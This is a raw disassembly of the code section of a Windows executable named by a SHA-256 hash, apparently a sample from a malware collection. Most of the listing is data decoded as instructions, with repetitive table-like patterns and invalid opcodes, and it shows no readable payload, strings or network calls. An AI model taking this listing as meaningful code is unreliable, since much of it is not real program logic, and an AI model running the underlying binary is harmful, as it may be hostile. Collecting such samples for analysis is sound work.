
87080bf25c45ac1d98a739632777c211763d9d4517dcfecbbfaa3b8694810003.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	int3   
  401001:	push   ebp
  401002:	inc    ebp
  401003:	add    al,dl
  401005:	push   ebp
  401006:	inc    ebp
  401007:	add    al,bh
  401009:	push   ebp
  40100a:	inc    ebp
  40100b:	add    BYTE PTR [eax],al
  40100d:	push   esi
  40100e:	inc    ebp
  40100f:	add    BYTE PTR [esi+edx*2],al
  401012:	inc    ebp
  401013:	add    al,bl
  401015:	push   ebp
  401016:	inc    ebp
  401017:	add    ah,bl
  401019:	push   ebp
  40101a:	inc    ebp
  40101b:	add    al,ah
  40101d:	push   ebp
  40101e:	inc    ebp
  40101f:	add    ah,ah
  401021:	push   ebp
  401022:	inc    ebp
  401023:	add    al,ch
  401025:	push   ebp
  401026:	inc    ebp
  401027:	add    ah,ch
  401029:	push   ebp
  40102a:	inc    ebp
  40102b:	add    al,dh
  40102d:	push   ebp
  40102e:	inc    ebp
  40102f:	add    BYTE PTR [ebx+edx*2+0x45],dh
  401033:	add    BYTE PTR [eax+0x53],bh
  401036:	inc    ebp
  401037:	add    BYTE PTR [ebx+edx*2+0x45],bh
  40103b:	add    BYTE PTR [eax-0x7bffbaad],al
  401041:	push   ebx
  401042:	inc    ebp
  401043:	add    BYTE PTR [eax-0x73ffbaad],cl
  401049:	push   ebx
  40104a:	inc    ebp
  40104b:	add    BYTE PTR [eax-0x6bffbaad],dl
  401051:	push   ebx
  401052:	inc    ebp
  401053:	add    BYTE PTR [eax-0x63ffbaad],bl
  401059:	push   ebx
  40105a:	inc    ebp
  40105b:	add    BYTE PTR [eax-0x5bffbaad],ah
  401061:	push   ebx
  401062:	inc    ebp
  401063:	add    BYTE PTR [eax-0x53ffbaad],ch
  401069:	push   ebx
  40106a:	inc    ebp
  40106b:	add    BYTE PTR [eax-0x4bffbaad],dh
  401071:	push   ebx
  401072:	inc    ebp
  401073:	add    BYTE PTR [eax-0x43ffbaad],bh
  401079:	push   ebx
  40107a:	inc    ebp
  40107b:	add    al,al
  40107d:	push   ebx
  40107e:	inc    ebp
  40107f:	add    ah,al
  401081:	push   ebx
  401082:	inc    ebp
  401083:	add    al,cl
  401085:	push   ebx
  401086:	inc    ebp
  401087:	add    ah,cl
  401089:	push   ebx
  40108a:	inc    ebp
  40108b:	add    al,dl
  40108d:	push   ebx
  40108e:	inc    ebp
  40108f:	add    ah,dl
  401091:	push   ebx
  401092:	inc    ebp
  401093:	add    al,bl
  401095:	push   ebx
  401096:	inc    ebp
  401097:	add    ah,bl
  401099:	push   ebx
  40109a:	inc    ebp
  40109b:	add    al,ah
  40109d:	push   ebx
  40109e:	inc    ebp
  40109f:	add    ah,ah
  4010a1:	push   ebx
  4010a2:	inc    ebp
  4010a3:	add    al,ch
  4010a5:	push   ebx
  4010a6:	inc    ebp
  4010a7:	add    ah,ch
  4010a9:	push   ebx
  4010aa:	inc    ebp
  4010ab:	add    al,dh
  4010ad:	push   ebx
  4010ae:	inc    ebp
  4010af:	add    ah,dh
  4010b1:	push   ebx
  4010b2:	inc    ebp
  4010b3:	add    al,bh
  4010b5:	push   ebx
  4010b6:	inc    ebp
  4010b7:	add    ah,bh
  4010b9:	push   ebx
  4010ba:	inc    ebp
  4010bb:	add    BYTE PTR [eax],al
  4010bd:	push   esp
  4010be:	inc    ebp
  4010bf:	add    BYTE PTR [esp+edx*2],al
  4010c2:	inc    ebp
  4010c3:	add    BYTE PTR [eax],cl
  4010c5:	push   esp
  4010c6:	inc    ebp
  4010c7:	add    BYTE PTR [esp+edx*2],cl
  4010ca:	inc    ebp
  4010cb:	add    BYTE PTR [eax],dl
  4010cd:	push   esp
  4010ce:	inc    ebp
  4010cf:	add    BYTE PTR [esp+edx*2],dl
  4010d2:	inc    ebp
  4010d3:	add    BYTE PTR [eax],bl
  4010d5:	push   esp
  4010d6:	inc    ebp
  4010d7:	add    BYTE PTR [esp+edx*2],bl
  4010da:	inc    ebp
  4010db:	add    BYTE PTR [eax],ah
  4010dd:	push   esp
  4010de:	inc    ebp
  4010df:	add    BYTE PTR [esp+edx*2],ah
  4010e2:	inc    ebp
  4010e3:	add    BYTE PTR [eax],ch
  4010e5:	push   esp
  4010e6:	inc    ebp
  4010e7:	add    BYTE PTR [esp+edx*2],ch
  4010ea:	inc    ebp
  4010eb:	add    BYTE PTR [eax],dh
  4010ed:	push   esp
  4010ee:	inc    ebp
  4010ef:	add    BYTE PTR [esp+edx*2],dh
  4010f2:	inc    ebp
  4010f3:	add    BYTE PTR [eax],bh
  4010f5:	push   esp
  4010f6:	inc    ebp
  4010f7:	add    BYTE PTR [esp+edx*2],bh
  4010fa:	inc    ebp
  4010fb:	add    BYTE PTR [eax+0x54],al
  4010fe:	inc    ebp
  4010ff:	add    BYTE PTR [esp+edx*2+0x45],al
  401103:	add    BYTE PTR [eax+0x54],cl
  401106:	inc    ebp
  401107:	add    BYTE PTR [esp+edx*2+0x45],cl
  40110b:	add    BYTE PTR [eax+0x54],dl
  40110e:	inc    ebp
  40110f:	add    BYTE PTR [esp+edx*2+0x45],dl
  401113:	add    BYTE PTR [eax+0x54],bl
  401116:	inc    ebp
  401117:	add    BYTE PTR [esp+edx*2+0x45],bl
  40111b:	add    BYTE PTR [eax+0x54],ah
  40111e:	inc    ebp
  40111f:	add    BYTE PTR [eax-0x4bffbaab],dh
  401125:	push   ebp
  401126:	inc    ebp
  401127:	add    BYTE PTR [eax-0x43ffbaab],bh
  40112d:	push   ebp
  40112e:	inc    ebp
  40112f:	add    al,al
  401131:	push   ebp
  401132:	inc    ebp
  401133:	add    ah,al
  401135:	push   ebp
  401136:	inc    ebp
  401137:	add    BYTE PTR [esp+edx*2+0x45],dh
  40113b:	add    BYTE PTR [eax+0x54],bh
  40113e:	inc    ebp
  40113f:	add    BYTE PTR [esp+edx*2+0x45],bh
  401143:	add    BYTE PTR [eax-0x7bffbaac],al
  401149:	push   esp
  40114a:	inc    ebp
  40114b:	add    BYTE PTR [eax-0x73ffbaac],cl
  401151:	push   esp
  401152:	inc    ebp
  401153:	add    BYTE PTR [eax-0x6bffbaac],dl
  401159:	push   esp
  40115a:	inc    ebp
  40115b:	add    BYTE PTR [eax-0x63ffbaac],bl
  401161:	push   esp
  401162:	inc    ebp
  401163:	add    BYTE PTR [eax-0x5bffbaac],ah
  401169:	push   esp
  40116a:	inc    ebp
  40116b:	add    BYTE PTR [eax-0x53ffbaac],ch
  401171:	push   esp
  401172:	inc    ebp
  401173:	add    BYTE PTR [eax-0x4bffbaac],dh
  401179:	push   esp
  40117a:	inc    ebp
  40117b:	add    BYTE PTR [eax-0x43ffbaac],bh
  401181:	push   esp
  401182:	inc    ebp
  401183:	add    al,al
  401185:	push   esp
  401186:	inc    ebp
  401187:	add    ah,al
  401189:	push   esp
  40118a:	inc    ebp
  40118b:	add    al,cl
  40118d:	push   esp
  40118e:	inc    ebp
  40118f:	add    ah,cl
  401191:	push   esp
  401192:	inc    ebp
  401193:	add    al,dl
  401195:	push   esp
  401196:	inc    ebp
  401197:	add    ah,dl
  401199:	push   esp
  40119a:	inc    ebp
  40119b:	add    al,bl
  40119d:	push   esp
  40119e:	inc    ebp
  40119f:	add    ah,bl
  4011a1:	push   esp
  4011a2:	inc    ebp
  4011a3:	add    al,ah
  4011a5:	push   esp
  4011a6:	inc    ebp
  4011a7:	add    ah,ah
  4011a9:	push   esp
  4011aa:	inc    ebp
  4011ab:	add    al,ch
  4011ad:	push   esp
  4011ae:	inc    ebp
  4011af:	add    ah,ch
  4011b1:	push   esp
  4011b2:	inc    ebp
  4011b3:	add    al,dh
  4011b5:	push   esp
  4011b6:	inc    ebp
  4011b7:	add    ah,dh
  4011b9:	push   esp
  4011ba:	inc    ebp
  4011bb:	add    al,bh
  4011bd:	push   esp
  4011be:	inc    ebp
  4011bf:	add    ah,bh
  4011c1:	push   esp
  4011c2:	inc    ebp
  4011c3:	add    BYTE PTR [eax],al
  4011c5:	push   ebp
  4011c6:	inc    ebp
  4011c7:	add    BYTE PTR [edx*2+0x55080045],al
  4011ce:	inc    ebp
  4011cf:	add    BYTE PTR [edx*2+0x55100045],cl
  4011d6:	inc    ebp
  4011d7:	add    BYTE PTR [edx*2+0x55180045],dl
  4011de:	inc    ebp
  4011df:	add    BYTE PTR [edx*2+0x55200045],bl
  4011e6:	inc    ebp
  4011e7:	add    BYTE PTR [edx*2+0x55280045],ah
  4011ee:	inc    ebp
  4011ef:	add    BYTE PTR [edx*2+0x55300045],ch
  4011f6:	inc    ebp
  4011f7:	add    BYTE PTR [edx*2+0x55380045],dh
  4011fe:	inc    ebp
  4011ff:	add    BYTE PTR [edx*2+0x55400045],bh
  401206:	inc    ebp
  401207:	add    BYTE PTR [ebp+edx*2+0x45],al
  40120b:	add    BYTE PTR [eax+0x55],cl
  40120e:	inc    ebp
  40120f:	add    BYTE PTR [ebp+edx*2+0x45],cl
  401213:	add    BYTE PTR [eax+0x55],dl
  401216:	inc    ebp
  401217:	add    BYTE PTR [ebp+edx*2+0x45],dl
  40121b:	add    BYTE PTR [eax+0x55],bl
  40121e:	inc    ebp
  40121f:	add    BYTE PTR [ebp+edx*2+0x45],bl
  401223:	add    BYTE PTR [eax+0x55],ah
  401226:	inc    ebp
  401227:	add    BYTE PTR [ebp+edx*2+0x45],ah
  40122b:	add    BYTE PTR [eax+0x55],ch
  40122e:	inc    ebp
  40122f:	add    BYTE PTR [ebp+edx*2+0x45],ch
  401233:	add    BYTE PTR [eax+0x55],dh
  401236:	inc    ebp
  401237:	add    BYTE PTR [ebp+edx*2+0x45],dh
  40123b:	add    BYTE PTR [eax+0x55],bh
  40123e:	inc    ebp
  40123f:	add    BYTE PTR [ebp+edx*2+0x45],bh
  401243:	add    BYTE PTR [eax-0x7bffbaab],al
  401249:	push   ebp
  40124a:	inc    ebp
  40124b:	add    BYTE PTR [eax-0x73ffbaab],cl
  401251:	push   ebp
  401252:	inc    ebp
  401253:	add    BYTE PTR [eax-0x6bffbaab],dl
  401259:	push   ebp
  40125a:	inc    ebp
  40125b:	add    BYTE PTR [eax-0x63ffbaab],bl
  401261:	push   ebp
  401262:	inc    ebp
  401263:	add    BYTE PTR [eax-0x5bffbaab],ah
  401269:	push   ebp
  40126a:	inc    ebp
  40126b:	add    BYTE PTR [eax+0x4555],ch
  401271:	add    al,0x0
  401273:	add    BYTE PTR [eax-0x77fff14e],dl
  401279:	mov    dl,0xe
  40127b:	add    BYTE PTR [ecx+eax*4],cl
  40127e:	sahf   
  40127f:	xor    edi,esp
  401281:	adc    BYTE PTR [esi-0x517ed3cd],0x33
  401288:	in     al,dx
  401289:	and    BYTE PTR [esi+0xa129033],0x0
  401290:	hlt    
  401291:	mov    cl,0xe
  401293:	add    BYTE PTR [ebx],ah
  401295:	test   BYTE PTR [ebp+0x37],dl
  401298:	mov    al,0x85
  40129a:	fs aaa 
  40129c:	scas   eax,DWORD PTR es:[edi]
  40129d:	test   DWORD PTR [esi+0x37],esi
  4012a0:	xchg   esi,eax
  4012a1:	test   DWORD PTR [ebp-0x497ac1c9],ebp
  4012a7:	aaa    
  4012a8:	fadd   QWORD PTR [ebx+esi*8+0x2f8a9b37]
  4012af:	cmp    BYTE PTR [ecx+0x2438a38a],ch
  4012b5:	mov    ebx,DWORD PTR [ecx-0x5477fac6]
  4012bb:	cmp    al,ah
  4012bd:	xchg   ebx,edx
  4012bf:	cmp    bl,bh
  4012c1:	xchg   edi,ebx
  4012c3:	cmp    esp,edi
  4012c5:	mov    BYTE PTR [eax-0x5c71d4c4],bl
  4012cb:	cmp    al,0x6
  4012cd:	mov    cs,esi
  4012cf:	cmp    al,0xd5
  4012d1:	(bad)  
  4012d2:	cli    
  4012d3:	cmp    al,0xaa
  4012d5:	lea    ebx,[edi*1+0x0]
  4012dc:	add    BYTE PTR [ebp-0x71],bl
  4012df:	outs   dx,DWORD PTR ds:[esi]
  4012e0:	cmp    eax,0x3d618f29
  4012e5:	push   ds
  4012e6:	pop    DWORD PTR [edx-0x6a71dac3]
  4012ec:	cmp    eax,0x3da48e33
  4012f1:	inc    ecx
  4012f2:	mov    ?,WORD PTR [ecx-0x2471b8c3]
  4012f8:	cmp    eax,0x3dff8e77
  4012fd:	imul   ecx,DWORD PTR [esi-0x737cc1f9],0x2f
  401304:	ds mov eax,0xb43e508c
  40130a:	mov    WORD PTR [ebx+0x3e],?
  40130d:	retf   0x9c8c
  401310:	ds dec esi
  401312:	(bad)  
  401313:	(bad)  
  401314:	ds sub eax,0x2b3eff8d
  40131a:	lea    ecx,[edx]
  40131c:	aas    
  40131d:	xchg   esi,eax
  40131e:	mov    edx,DWORD PTR [edi]
  401320:	aas    
  401321:	jle    0x4012ae
  401323:	sub    bh,BYTE PTR [edi]
  401325:	mov    esi,DWORD PTR gs:[ecx]
  401328:	aas    
  401329:	push   esp
  40132a:	mov    eax,DWORD PTR [edi+edi*1+0x57]
  40132e:	mov    ebx,DWORD PTR [ebx+0x3f]
  401331:	pop    ecx
  401332:	mov    edx,DWORD PTR [eax+0x3f]
  401335:	ins    BYTE PTR es:[edi],dx
  401336:	mov    edi,DWORD PTR [edi+edi*1+0x68]
  40133a:	mov    esi,DWORD PTR [ebx+0x3f]
  40133d:	adc    cl,BYTE PTR [ecx+edx*4+0x3f]
  401344:	add    BYTE PTR [eax],al
  401346:	sub    cl,BYTE PTR [eax+ebx*8-0x13744bc1]
  40134d:	aas    
  40134e:	mov    esp,0x90000e8b
  401353:	add    cl,BYTE PTR [edx]
  401355:	add    BYTE PTR [edx+esi*4+0xe],dh
  401359:	add    BYTE PTR [esi+0x58303582],bl
  40135f:	adc    BYTE PTR [edx+0x30],0x2e
  401363:	cmp    BYTE PTR [ebp+0x30],0x19
  401367:	or     BYTE PTR [edi-0x657cf6d0],0x30
  40136e:	cmp    BYTE PTR [edx-0x7db6cf41],al
  401374:	(bad)  
  401375:	xor    BYTE PTR [eax-0x6ffff14e],dl
  40137b:	mov    dl,0xe
  40137d:	add    BYTE PTR [eax-0x6ffff14e],dl
  401383:	mov    dl,0xe
  401385:	add    BYTE PTR [eax-0x6ffff14e],dl
  40138b:	mov    dl,0xe
  40138d:	add    BYTE PTR [eax-0x6ffff14e],dl
  401393:	mov    dl,0xe
  401395:	add    BYTE PTR [eax-0x6ffff14e],dl
  40139b:	mov    dl,0xe
  40139d:	add    BYTE PTR [eax-0x6ffff14e],dl
  4013a3:	mov    dl,0xe
  4013a5:	add    BYTE PTR [eax+0xeb2],dl
  4013ab:	add    BYTE PTR [eax],al
  4013ad:	add    BYTE PTR [eax],al
  4013af:	nop
  4013b0:	mov    dl,0xe
  4013b2:	add    BYTE PTR [eax-0x6ffff14e],dl
  4013b8:	mov    dl,0xe
  4013ba:	add    BYTE PTR [eax-0x6ffff14e],dl
  4013c0:	mov    dl,0xe
  4013c2:	add    BYTE PTR [eax-0x6ffff14e],dl
  4013c8:	mov    dl,0xe
  4013ca:	add    BYTE PTR [eax-0x6ffff14e],dl
  4013d0:	mov    dl,0xe
  4013d2:	add    BYTE PTR [eax-0x6ffff14e],dl
  4013d8:	mov    dl,0xe
  4013da:	add    BYTE PTR [eax-0x6ffff14e],dl
  4013e0:	mov    dl,0xe
  4013e2:	add    BYTE PTR [eax-0x6ffff14e],dl
  4013e8:	mov    dl,0xe
  4013ea:	add    BYTE PTR [eax-0x6ffff14e],dl
  4013f0:	mov    dl,0xe
  4013f2:	add    BYTE PTR [eax-0x6ffff14e],dl
  4013f8:	mov    dl,0xe
  4013fa:	add    BYTE PTR [eax-0x6ffff14e],dl
  401400:	mov    dl,0xe
  401402:	add    BYTE PTR [eax-0x6ffff14e],dl
  401408:	mov    dl,0xe
  40140a:	add    BYTE PTR [eax-0x6ffff14e],dl
  401410:	mov    dl,0xe
  401412:	add    BYTE PTR [eax],al
  401414:	add    BYTE PTR [eax],al
  401416:	add    BYTE PTR [eax],al
  401418:	nop
  401419:	mov    dl,0xe
  40141b:	add    BYTE PTR [eax-0x6ffff14e],dl
  401421:	mov    dl,0xe
  401423:	add    BYTE PTR [eax-0x6ffff14e],dl
  401429:	mov    dl,0xe
  40142b:	add    BYTE PTR [eax-0x6ffff14e],dl
  401431:	mov    dl,0xe
  401433:	add    BYTE PTR [eax-0x6ffff14e],dl
  401439:	mov    dl,0xe
  40143b:	add    BYTE PTR [eax-0x6ffff14e],dl
  401441:	mov    dl,0xe
  401443:	add    BYTE PTR [eax-0x6ffff14e],dl
  401449:	mov    dl,0xe
  40144b:	add    BYTE PTR [eax-0x6ffff14e],dl
  401451:	mov    dl,0xe
  401453:	add    BYTE PTR [eax-0x6ffff14e],dl
  401459:	mov    dl,0xe
  40145b:	add    BYTE PTR [eax-0x6ffff14e],dl
  401461:	mov    dl,0xe
  401463:	add    BYTE PTR [eax-0x6ffff14e],dl
  401469:	mov    dl,0xe
  40146b:	add    BYTE PTR [eax-0x6ffff14e],dl
  401471:	mov    dl,0xe
  401473:	add    BYTE PTR [eax-0x6ffff14e],dl
  401479:	mov    dl,0xe
  40147b:	add    BYTE PTR [eax],al
  40147d:	add    BYTE PTR [eax],al
  40147f:	add    BYTE PTR [eax],al
  401481:	nop
  401482:	mov    dl,0xe
  401484:	add    BYTE PTR [eax-0x6ffff14e],dl
  40148a:	mov    dl,0xe
  40148c:	add    BYTE PTR [eax-0x6ffff14e],dl
  401492:	mov    dl,0xe
  401494:	add    BYTE PTR [eax-0x6ffff14e],dl
  40149a:	mov    dl,0xe
  40149c:	add    BYTE PTR [eax-0x6ffff14e],dl
  4014a2:	mov    dl,0xe
  4014a4:	add    BYTE PTR [eax-0x6ffff14e],dl
  4014aa:	mov    dl,0xe
  4014ac:	add    BYTE PTR [eax-0x6ffff14e],dl
  4014b2:	mov    dl,0xe
  4014b4:	add    BYTE PTR [eax-0x6ffff14e],dl
  4014ba:	mov    dl,0xe
  4014bc:	add    BYTE PTR [eax-0x6ffff14e],dl
  4014c2:	mov    dl,0xe
  4014c4:	add    BYTE PTR [eax-0x6ffff14e],dl
  4014ca:	mov    dl,0xe
  4014cc:	add    BYTE PTR [eax-0x6ffff14e],dl
  4014d2:	mov    dl,0xe
  4014d4:	add    BYTE PTR [eax-0x6ffff14e],dl
  4014da:	mov    dl,0xe
  4014dc:	add    BYTE PTR [eax-0x6ffff14e],dl
  4014e2:	mov    dl,0xe
  4014e4:	add    BYTE PTR [eax],al
  4014e6:	add    BYTE PTR [eax],al
  4014e8:	add    BYTE PTR [eax],al
  4014ea:	nop
  4014eb:	mov    dl,0xe
  4014ed:	add    BYTE PTR [eax-0x6ffff14e],dl
  4014f3:	mov    dl,0xe
  4014f5:	add    BYTE PTR [eax-0x6ffff14e],dl
  4014fb:	mov    dl,0xe
  4014fd:	add    BYTE PTR [eax-0x6ffff14e],dl
  401503:	mov    dl,0xe
  401505:	add    BYTE PTR [eax-0x6ffff14e],dl
  40150b:	mov    dl,0xe
  40150d:	add    BYTE PTR [eax-0x6ffff14e],dl
  401513:	mov    dl,0xe
  401515:	add    BYTE PTR [eax-0x6ffff14e],dl
  40151b:	mov    dl,0xe
  40151d:	add    BYTE PTR [eax-0x6ffff14e],dl
  401523:	mov    dl,0xe
  401525:	add    BYTE PTR [eax-0x6ffff14e],dl
  40152b:	mov    dl,0xe
  40152d:	add    BYTE PTR [eax-0x6ffff14e],dl
  401533:	mov    dl,0xe
  401535:	add    BYTE PTR [eax-0x6ffff14e],dl
  40153b:	mov    dl,0xe
  40153d:	add    BYTE PTR [eax-0x6ffff14e],dl
  401543:	mov    dl,0xe
  401545:	add    BYTE PTR [eax-0x6ffff14e],dl
  40154b:	mov    dl,0xe
  40154d:	add    BYTE PTR [eax],al
  40154f:	add    BYTE PTR [eax],al
  401551:	add    BYTE PTR [eax],al
  401553:	nop
  401554:	mov    dl,0xe
  401556:	add    BYTE PTR [eax-0x6ffff14e],dl
  40155c:	mov    dl,0xe
  40155e:	add    BYTE PTR [eax-0x6ffff14e],dl
  401564:	mov    dl,0xe
  401566:	add    BYTE PTR [eax-0x6ffff14e],dl
  40156c:	mov    dl,0xe
  40156e:	add    BYTE PTR [eax-0x6ffff14e],dl
  401574:	mov    dl,0xe
  401576:	add    BYTE PTR [eax-0x6ffff14e],dl
  40157c:	mov    dl,0xe
  40157e:	add    BYTE PTR [eax-0x6ffff14e],dl
  401584:	mov    dl,0xe
  401586:	add    BYTE PTR [eax-0x6ffff14e],dl
  40158c:	mov    dl,0xe
  40158e:	add    BYTE PTR [eax-0x6ffff14e],dl
  401594:	mov    dl,0xe
  401596:	add    BYTE PTR [eax-0x6ffff14e],dl
  40159c:	mov    dl,0xe
  40159e:	add    BYTE PTR [eax-0x6ffff14e],dl
  4015a4:	mov    dl,0xe
  4015a6:	add    BYTE PTR [eax-0x6ffff14e],dl
  4015ac:	mov    dl,0xe
  4015ae:	add    BYTE PTR [eax-0x6ffff14e],dl
  4015b4:	mov    dl,0xe
  4015b6:	add    BYTE PTR [eax],al
  4015b8:	add    BYTE PTR [eax],al
  4015ba:	add    BYTE PTR [eax],al
  4015bc:	nop
  4015bd:	mov    dl,0xe
  4015bf:	add    BYTE PTR [eax-0x6ffff14e],dl
  4015c5:	mov    dl,0xe
  4015c7:	add    BYTE PTR [eax-0x6ffff14e],dl
  4015cd:	mov    dl,0xe
  4015cf:	add    BYTE PTR [eax-0x6ffff14e],dl
  4015d5:	mov    dl,0xe
  4015d7:	add    BYTE PTR [eax-0x6ffff14e],dl
  4015dd:	mov    dl,0xe
  4015df:	add    BYTE PTR [eax-0x6ffff14e],dl
  4015e5:	mov    dl,0xe
  4015e7:	add    BYTE PTR [eax-0x6ffff14e],dl
  4015ed:	mov    dl,0xe
  4015ef:	add    BYTE PTR [eax-0x6ffff14e],dl
  4015f5:	mov    dl,0xe
  4015f7:	add    BYTE PTR [eax-0x6ffff14e],dl
  4015fd:	mov    dl,0xe
  4015ff:	add    BYTE PTR [eax-0x6ffff14e],dl
  401605:	mov    dl,0xe
  401607:	add    BYTE PTR [eax-0x6ffff14e],dl
  40160d:	mov    dl,0xe
  40160f:	add    BYTE PTR [eax-0x6ffff14e],dl
  401615:	mov    dl,0xe
  401617:	add    BYTE PTR [eax-0x6ffff14e],dl
  40161d:	mov    dl,0xe
  40161f:	add    BYTE PTR [eax],al
  401621:	add    BYTE PTR [eax],al
  401623:	add    BYTE PTR [eax],al
  401625:	nop
  401626:	mov    dl,0xe
  401628:	add    BYTE PTR [eax-0x6ffff14e],dl
  40162e:	mov    dl,0xe
  401630:	add    BYTE PTR [eax-0x6ffff14e],dl
  401636:	mov    dl,0xe
  401638:	add    BYTE PTR [eax-0x6ffff14e],dl
  40163e:	mov    dl,0xe
  401640:	add    BYTE PTR [eax-0x6ffff14e],dl
  401646:	mov    dl,0xe
  401648:	add    BYTE PTR [eax-0x6ffff14e],dl
  40164e:	mov    dl,0xe
  401650:	add    BYTE PTR [eax-0x6ffff14e],dl
  401656:	mov    dl,0xe
  401658:	add    BYTE PTR [eax-0x6ffff14e],dl
  40165e:	mov    dl,0xe
  401660:	add    BYTE PTR [eax-0x6ffff14e],dl
  401666:	mov    dl,0xe
  401668:	add    BYTE PTR [eax-0x6ffff14e],dl
  40166e:	mov    dl,0xe
  401670:	add    BYTE PTR [eax-0x6ffff14e],dl
  401676:	mov    dl,0xe
  401678:	add    BYTE PTR [eax-0x6ffff14e],dl
  40167e:	mov    dl,0xe
  401680:	add    BYTE PTR [eax-0x6ffff14e],dl
  401686:	mov    dl,0xe
  401688:	add    BYTE PTR [eax],al
  40168a:	add    BYTE PTR [eax],al
  40168c:	add    BYTE PTR [eax],al
  40168e:	nop
  40168f:	mov    dl,0xe
  401691:	add    BYTE PTR [eax-0x6ffff14e],dl
  401697:	mov    dl,0xe
  401699:	add    BYTE PTR [eax-0x6ffff14e],dl
  40169f:	mov    dl,0xe
  4016a1:	add    BYTE PTR [eax+0xeb2],dl
  4016a7:	scas   eax,DWORD PTR es:[edi]
  4016a8:	add    al,0x0
  4016aa:	nop
  4016ab:	add    BYTE PTR [edx+0x0],cl
  4016ae:	iret   
  4016af:	xlat   BYTE PTR ds:[ebx]
  4016b0:	jp     0x401702
  4016b2:	loop   0x401691
  4016b4:	ins    DWORD PTR es:[edi],dx
  4016b5:	inc    ecx
  4016b6:	in     al,dx
  4016b7:	(bad)  
  4016b8:	jl     0x40171f
  4016ba:	ret    
  4016bb:	ror    DWORD PTR [esi],0x0
  4016be:	aam    0xdd
  4016c0:	outs   dx,DWORD PTR ds:[esi]
  4016c1:	fs int3 
  4016c3:	fld    TBYTE PTR [edx+esi*2-0x4f]
  4016c7:	shl    BYTE PTR [edi+0x45],0xa8
  4016cb:	repz push cs
  4016cd:	add    ah,dl
  4016cf:	(bad)  [edi+0x64]
  4016d2:	int3   
  4016d3:	fld    TBYTE PTR [edx+esi*2-0x4f]
  4016d7:	shl    BYTE PTR [edi+0x45],0x88
  4016db:	in     eax,0xe
  4016dd:	add    BYTE PTR [edi-0x29],cl
  4016e0:	jp     0x40172f
  4016e2:	outs   dx,DWORD PTR ds:[esi]
  4016e3:	(bad)  
  4016e4:	jnp    0x401752
  4016e6:	ins    DWORD PTR es:[edi],dx
  4016e7:	cli    
  4016e8:	outs   dx,DWORD PTR ds:[esi]
  4016e9:	outs   dx,BYTE PTR ds:[esi]
  4016ea:	je     0x4016ca
  4016ec:	imul   eax,DWORD PTR [ecx-0x70],0xffffffb2
  4016f0:	push   cs
  4016f1:	add    BYTE PTR [ebx-0x40],dl
  4016f4:	imul   esp,DWORD PTR [ecx+0x5c],0xffffffd7
  4016f8:	dec    eax
  4016f9:	imul   edi,DWORD PTR [edi+edx*8],0xc134004f
  401700:	jp     0x401774
  401702:	xor    edx,ebx
  401704:	jp     0x401747
  401706:	nop
  401707:	mov    dl,0xe
  401709:	add    BYTE PTR [edi-0x29],dl
  40170c:	jp     0x401765
  40170e:	add    BYTE PTR [eax],al
  401710:	add    BYTE PTR [eax],al
  401712:	add    BYTE PTR [ecx],bh
  401714:	fsubr  QWORD PTR [edx+0x6f]
  401717:	daa    
  401718:	ror    DWORD PTR [edx+0x69],0x22
  40171c:	xlat   BYTE PTR ds:[ebx]
  40171d:	ins    DWORD PTR es:[edi],dx
  40171e:	je     0x40171f
  401720:	shl    BYTE PTR [edi+0x41],0x90
  401724:	mov    dl,0xe
  401726:	add    bh,dl
  401728:	aad    0x7a
  40172a:	dec    ebp
  40172b:	out    0xd6,eax
  40172d:	jnp    0x40179b
  40172f:	cmc    
  401730:	cli    
  401731:	outs   dx,DWORD PTR ds:[esi]
  401732:	outs   dx,BYTE PTR ds:[esi]
  401733:	in     al,dx
  401734:	fisubr WORD PTR [ebx+0x57]
  401737:	nop
  401738:	mov    dl,0xe
  40173a:	add    BYTE PTR [edi+ebp*4-0x505bffb2],cl
  401741:	dec    esi
  401742:	add    BYTE PTR [edi+ebp*4+0x4e],ch
  401746:	add    BYTE PTR [edi+ebp*4-0x5037ffb2],al
  40174d:	dec    esi
  40174e:	add    ah,al
  401750:	scas   eax,DWORD PTR es:[edi]
  401751:	dec    esi
  401752:	add    BYTE PTR [eax-0x67ffb151],dh
  401758:	scas   eax,DWORD PTR es:[edi]
  401759:	dec    esi
  40175a:	add    bh,cl
  40175c:	aad    0x7a
  40175e:	push   eax
  40175f:	sbb    bl,0x6d
  401762:	inc    ecx
  401763:	ins    BYTE PTR es:[edi],dx
  401764:	(bad)  
  401765:	jl     0x4017cc
  401767:	cmp    DWORD PTR [edi-0x24bbfff2],0x6f
  40176e:	fs pop esp
  401770:	fldcw  WORD PTR [edx+esi*2+0x71]
  401774:	shl    BYTE PTR [edi+0x45],0x0
  401778:	add    BYTE PTR [eax],al
  40177a:	add    BYTE PTR [eax],al
  40177c:	pop    eax
  40177d:	icebp  
  40177e:	push   cs
  40177f:	add    BYTE PTR [ebx-0x2b],ch
  401782:	jl     0x4017f2
  401784:	xor    eax,0x76323dde
  401789:	(bad)  
  40178a:	bound  ebp,QWORD PTR [eax+edx*4-0x4e]
  40178e:	push   cs
  40178f:	add    BYTE PTR ds:0x226378bf,ah
  401795:	(bad)  
  401796:	and    BYTE PTR [esp+esi*1-0x22],ah
  40179a:	push   cs
  40179b:	add    BYTE PTR ds:0x2d7363d5,ch
  4017a1:	(bad)  
  4017a2:	push   cs
  4017a3:	add    ch,bh
  4017a5:	mov    edi,0xc7026378
  4017aa:	and    BYTE PTR [esp+ebp*8-0x22],ah
  4017ae:	push   cs
  4017af:	add    ch,ah
  4017b1:	aad    0x63
  4017b3:	arpl   ax,sp
  4017b5:	leave  
  4017b6:	push   cs
  4017b7:	add    BYTE PTR [esi-0x1a8b8327],bh
  4017bd:	shl    DWORD PTR [edx+0x41],1
  4017c0:	in     al,0xde
  4017c2:	popa   
  4017c3:	arpl   WORD PTR [eax-0x22fff14e],dx
  4017c9:	fsub   QWORD PTR [ebx+0x61]
  4017cc:	shl    ah,0x67
  4017cf:	gs mov edi,0xb94668fb
  4017d5:	fisubr WORD PTR [ebx+0x0]
  4017d8:	mov    esi,0xa5747cd9
  4017dd:	shl    DWORD PTR [edx+0x50],1
  4017e0:	add    BYTE PTR [eax],al
  4017e2:	add    BYTE PTR [eax],al
  4017e4:	add    BYTE PTR [edx+0x73657adb],ah
  4017ea:	(bad)  
  4017eb:	push   cs
  4017ec:	add    BYTE PTR [eax-0x2b],bl
  4017ef:	outs   dx,DWORD PTR ds:[esi]
  4017f0:	jo     0x401843
  4017f2:	fisub  WORD PTR [edx+0x6f]
  4017f5:	jae    0x4017a9
  4017f7:	push   cs
  4017f8:	add    BYTE PTR [ebx-0x2b],bh
  4017fb:	jl     0x40186b
